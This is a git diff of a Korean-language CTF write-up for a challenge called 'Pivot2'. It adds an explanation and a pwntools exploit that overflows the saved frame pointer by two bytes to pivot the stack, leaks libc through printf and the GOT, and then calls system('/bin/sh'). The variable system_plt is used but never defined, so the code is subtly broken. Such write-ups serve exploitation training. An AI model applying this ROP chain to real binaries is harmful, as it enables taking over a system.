@@ -81,7 +81,7 @@ p.interactive()
 
 ## 2 Pivot2
 
-2bytes밖에 bof가 일어나지 않지만 Stack Pivoting을 이용하여 SFP를 덮을 수 있다. 그 이유는 SFP의 주소가 buf주소와 1.5byte 정도 차이가 나기 때문이다. SFP의 끝 2bytes를 buf의 끝 2bytes로 덮어주면 fake stack을 형성하여 payload를 실행할 수 있다.
+2bytes밖에 bof가 일어나지 않지만 Stack Pivoting을 이용하여 SFP를 덮을 수 있다. 그 이유는 SFP의 주소가 buf주소와 1.5byte 정도 차이가 나기 때문이다. SFP의 끝 2bytes를 buf의 끝 2bytes로 덮어주면 fake stack을 형성하여 payload를 실행할 수 있다. fake stack에서 printf를 이용하여 printf 함수의 주소를 알아내고 libc_leak을 진행한 뒤 같은 방법으로 stack pivoting을 진행하여 system rtl을 시도했다.
 
 
 ```python
@@ -93,22 +93,42 @@ libc = e.libc
 
 
 buf_addr = int(p.recv(14), 16)
-buf_addr_bof = buf_addr % 0x10000
+buf_addr_2byte = buf_addr % 0x10000
+
+printf_got = 0x600fd8
+printf_plt = 0x004004ce
+pop_rdi = 0x004006f3
+main = 0x0000000000400639
 
 
 payload = b'A'*0x8
-payload += 
+# printf(printf_got)
+payload += p64(pop_rdi)
+payload += p64(printf_got)
+payload += p64(0x004004ce) #ret
+payload += p64(printf_plt)
+payload += p64(main)
 payload += b'B'*(0x100-len(payload))
-payload += p64(buf_addr_bof)
-
-
-#write(1, write_got, 8)
-#system('/bin/sh')
+payload += p64(buf_addr_2byte)
 
 p.send(payload)
 
+printf_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+libc_base = printf_addr - libc.symbols['printf']
+system_addr = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
 
 
+payload = b'A'*0x8
+# system('/bin/sh')
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(0x004004ce) #ret
+payload += p64(system_plt)
+payload += b'B'*(0x100-len(payload))
+payload += p64(buf_addr_2byte)
+
+p.send(payload)
 
 p.interactive()
 
